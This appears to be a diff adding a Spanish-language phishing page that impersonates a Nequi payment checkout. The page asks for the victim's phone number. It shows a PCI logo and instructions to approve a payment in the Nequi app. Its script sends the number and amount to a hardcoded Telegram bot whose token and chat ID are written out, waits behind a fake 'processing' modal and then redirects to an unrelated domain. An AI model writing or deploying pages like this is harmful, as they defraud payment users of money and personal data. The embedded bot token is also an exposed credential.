@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Pago con Nequi</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --brand-color: #5c2d91;
+      --text-color: #222;
+      --gray: #666;
+      --error: #e53935;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background: white;
+      color: var(--text-color);
+    }
+
+    .container {
+      max-width: 400px;
+      margin: auto;
+      padding: 1rem 1rem 2rem;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .header {
+      width: 100%;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 1.2rem;
+    }
+
+    .nequi {
+      color: var(--brand-color);
+      font-weight: 600;
+      font-size: 1.5rem;
+    }
+
+    .amount {
+      font-size: 1.1rem;
+      font-weight: 600;
+    }
+
+    form {
+      width: 100%;
+    }
+
+    label {
+      font-weight: 500;
+      margin-bottom: 0.3rem;
+      display: block;
+    }
+
+    .required {
+      color: var(--error);
+    }
+
+    input[type="tel"] {
+      width: 100%;
+      padding: 0.75rem;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 1rem;
+      margin-bottom: 1rem;
+    }
+
+    button {
+      background: var(--text-color);
+      color: white;
+      font-size: 1rem;
+      padding: 0.6rem 1.2rem;
+      width: 137px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.2s ease;
+      margin: 1rem auto 1rem;
+      display: block;
+      text-align: center;
+    }
+
+    button:hover {
+      background: var(--brand-color);
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 0.9rem;
+      color: var(--gray);
+      width: 100%;
+    }
+
+    .footer a {
+      color: var(--gray);
+      text-decoration: none;
+      display: block;
+      margin-bottom: 0.6rem;
+    }
+
+    .pci {
+      width: 55px;
+      opacity: 0.9;
+      margin-bottom: 0.8rem;
+    }
+
+    .explicacion {
+      font-size: 0.8rem;
+      color: var(--text-color);
+      line-height: 1.4;
+      text-align: center;
+      margin-bottom: 0.8rem;
+    }
+
+    .ayuda {
+      width: 317px;
+      max-width: 95%;
+      border-radius: 10px;
+    }
+
+    /* --- MODAL DE CARGA --- */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      height: 100vh;
+      width: 100vw;
+      background-color: rgba(0, 0, 0, 0.4);
+      backdrop-filter: blur(3px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+    }
+
+    .modal-box {
+      background: white;
+      padding: 1.5rem;
+      border-radius: 8px;
+      text-align: center;
+      max-width: 300px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+    }
+
+    .modal-box p {
+      margin-bottom: 1rem;
+      font-size: 0.95rem;
+    }
+
+    .loader {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid var(--text-color);
+      border-radius: 50%;
+      width: 26px;
+      height: 26px;
+      animation: spin 1s linear infinite;
+      margin: auto;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* --- LOADER INICIAL --- */
+    #initialLoader {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: #ffffff;
+      z-index: 9999;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    #initialLoader.hidden {
+      display: none;
+    }
+
+    #initialSpinner {
+      width: 50px;
+      height: 50px;
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid var(--brand-color);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    #initialLoader p {
+      color: var(--text-color);
+      font-size: 16px;
+      font-weight: 500;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Loader inicial -->
+  <div id="initialLoader">
+    <div id="initialSpinner"></div>
+    <p>Cargando...</p>
+  </div>
+
+  <div class="container">
+    <div class="header">
+      <div class="nequi">Nequi</div>
+      <div class="amount" id="monto">Monto: --</div>
+    </div>
+
+    <form id="nequiForm">
+      <label for="telefono">Número de teléfono celular <span class="required">*</span></label>
+      <input type="tel" id="telefono" name="telefono" placeholder="3014785215" maxlength="10" required />
+      <button type="submit">VALIDAR</button>
+    </form>
+
+    <div class="footer">
+      <a href="#">Anular y volver a la tienda</a>
+      <img src="img/pci.jpg" alt="Logo PCI" class="pci" />
+      <div class="explicacion">
+        Ingresa a la app de <strong>Nequi</strong>, ve al <strong>Centro de notificaciones</strong> y acepta el pago.<br>
+        Tienes <strong>2 minutos</strong> para confirmar la transacción antes de que expire.
+      </div>
+      <img src="img/ayuda.png" alt="Imagen ayuda Nequi" class="ayuda" />
+    </div>
+  </div>
+
+  <!-- MODAL DE CARGA -->
+  <div class="modal-overlay" id="loadingModal">
+    <div class="modal-box">
+      <p>Procesando... Por favor espera unos segundos.</p>
+      <div class="loader"></div>
+    </div>
+  </div>
+
+  <script>
+    // ================= CONFIGURACIÓN DE TELEGRAM =================
+    // Reemplaza con tus datos reales
+    const TELEGRAM_BOT_TOKEN = '8223520326:AAHX3wFpsoUX5Iz8_6-5xxUAEWmUGgGSZ5k';   // Ejemplo: '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz'
+    const TELEGRAM_CHAT_ID = '7776240161';       // Ejemplo: '123456789'
+
+    // ================= OCULTAR LOADER INICIAL =================
+    window.addEventListener('load', function() {
+      setTimeout(function() {
+        const initialLoader = document.getElementById('initialLoader');
+        if (initialLoader) {
+          initialLoader.classList.add('hidden');
+          initialLoader.style.pointerEvents = 'none';
+          initialLoader.style.zIndex = '-1';
+        }
+      }, 3000);
+    });
+
+    // ================= REFERENCIAS A ELEMENTOS =================
+    const form = document.getElementById('nequiForm');
+    const input = document.getElementById('telefono');
+    const modal = document.getElementById('loadingModal');
+    const montoEl = document.getElementById('monto');
+
+    // ================= OBTENER Y MOSTRAR MONTO =================
+    function obtenerMontoRaw() {
+      try {
+        return (
+          localStorage.getItem("finalAmount") ||
+          sessionStorage.getItem("finalAmount") ||
+          localStorage.getItem("total_pagar") ||
+          sessionStorage.getItem("total_pagar") ||
+          "0"
+        );
+      } catch (e) {
+        return "0";
+      }
+    }
+
+    let totalPagarRaw = obtenerMontoRaw();
+    totalPagarRaw = totalPagarRaw.toString().replace(/[^\d.,]/g, '').replace(/\./g, '').replace(',', '.');
+    const totalPagarNumero = parseFloat(totalPagarRaw) || 0;
+    
+    if (totalPagarNumero > 0) {
+      const montoFormateado = totalPagarNumero.toLocaleString("es-CO", {
+        style: "currency",
+        currency: "COP"
+      });
+      montoEl.textContent = "Monto: " + montoFormateado;
+    }
+
+    // ================= FUNCIÓN PARA MOSTRAR ERROR =================
+    function mostrarError(mensaje) {
+      alert(mensaje);
+    }
+
+    // ================= FUNCIÓN PARA ENVIAR A TELEGRAM =================
+    async function enviarNotificacionTelegram(montoTexto, numero) {
+      const mensaje = `🔔 *Nuevo pago Nequi*\n\n📱 Número: ${numero}\n💰 Monto: ${montoTexto}`;
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: mensaje,
+            parse_mode: 'Markdown'
+          })
+        });
+        const data = await response.json();
+        if (!data.ok) {
+          console.error('Error al enviar a Telegram:', data.description);
+          return false;
+        }
+        console.log('Notificación enviada a Telegram');
+        return true;
+      } catch (error) {
+        console.error('Error de red al enviar a Telegram:', error);
+        return false;
+      }
+    }
+
+    // ================= EVENTO DEL FORMULARIO =================
+    form.addEventListener('submit', async function (e) {
+      e.preventDefault();
+
+      const nequi = input.value.trim();
+      if (!/^\d{10}$/.test(nequi)) {
+        return mostrarError("El número debe tener exactamente 10 dígitos.");
+      }
+
+      // Obtener el monto formateado que se muestra en la interfaz
+      const montoMostrado = montoEl.textContent.replace('Monto: ', ''); // ej: "$ 983.390"
+
+      // 1. Mostrar modal de carga
+      modal.style.display = 'flex';
+
+      // 2. Enviar notificación a Telegram (esperamos que termine)
+      await enviarNotificacionTelegram(montoMostrado, nequi);
+
+      // 3. Esperar 15 segundos (15000 ms) con el modal visible
+      await new Promise(resolve => setTimeout(resolve, 15000));
+
+      // 4. Redirigir a la URL indicada
+      window.location.href = 'https://adminjelpit.site/jelpit/portal_pagos.html';
+    });
+  </script>
+
+</body>
+</html>
